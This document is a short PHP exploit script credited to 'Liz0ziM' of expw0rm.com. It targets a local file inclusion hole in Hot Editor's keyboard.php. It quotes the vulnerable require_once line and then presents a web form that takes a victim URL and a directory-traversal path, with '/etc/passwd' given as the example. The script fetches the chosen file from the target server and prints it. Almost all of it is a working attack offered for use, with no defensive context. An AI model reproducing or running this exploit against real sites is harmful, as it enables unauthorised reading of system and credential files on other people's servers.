<?php
/*
Vendor : Liz0ziM
Web    : www.expw0rm.com
Mail   : liz0@expw0rm.com
---------------------------------------
Vul. Code : keyboard.php line 3


        require_once "./vk_code/$first";
----------------------------------------
*/
?>

Hot Editor Local File &#304;nclude Exploit <a 
href="http://www.expw0rm.com">Expw0rm</a> By Liz0ziM<br>
<form method="POST">
Target Url: <input name="url" type="text"> example: 
http://victim.com/richedit/<br>
File :<input name="sec" type="text"> example : 
../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd 
<br>
<input type=submit name="yolla" value="Send"><br>
<?
if(isset($_POST[yolla]))
{
$url=$_POST[url];
$sec=$_POST[sec];
$git=$url."/keyboard.php?first=".$sec;
$ac=fopen($git,"r") or die("acamadim");;

while(!feof($ac) )
{
$cek=fgets($ac,1024);
if(eregi("<html>",$cek)) { echo '<br>Finishim'; exit();}
echo '<pre>';
echo $cek;
echo '</pre>';
}
fclose($ac);
}
?>

